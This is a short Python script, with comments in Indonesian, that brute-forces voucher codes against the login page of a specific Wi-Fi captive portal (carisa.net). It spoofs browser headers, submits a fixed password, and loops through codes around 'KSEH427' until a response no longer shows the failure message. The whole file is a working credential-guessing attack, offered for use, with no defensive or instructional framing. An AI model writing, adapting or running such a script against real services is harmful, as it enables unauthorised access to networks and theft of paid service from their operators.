import requests
import string

URL = "https://carisa.net/login"
PASSWORD = "e16c829324597ab36453eecff57215c6"
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Content-Type": "application/x-www-form-urlencoded",
    "Referer": "https://carisa.net/login"
}

def check(voucher):
    payload = {
        "username": voucher,
        "password": PASSWORD,
        "dst": "http://www.msftconnecttest.com/redirect",
        "popup": "true"
    }
    r = requests.post(URL, data=payload, headers=HEADERS)
    if "tidak sesuai" not in r.text.lower():
        return True
    return False

# Coba variasi sekitar KSEH427
base_prefix = "KSEH"
start_num = 427
range_size = 50 # Mencoba 50 kombinasi di sekitar angka tersebut

found = False
for i in range(-range_size, range_size + 1):
    num = start_num + i
    if num < 0: continue
    
    # Format: Prefix + Angka (pastikan panjang total 7 karakter)
    # Jika angkanya 3 digit, formatnya KSEH + 3digit
    voucher = f"{base_prefix}{num:03d}"
    
    print(f"Mencari: {voucher} ...")
    if check(voucher):
        print(f"*** DITEMUKAN: {voucher} ***")
        found = True
        break

if not found:
    print("Tidak ditemukan dalam rentang tersebut.")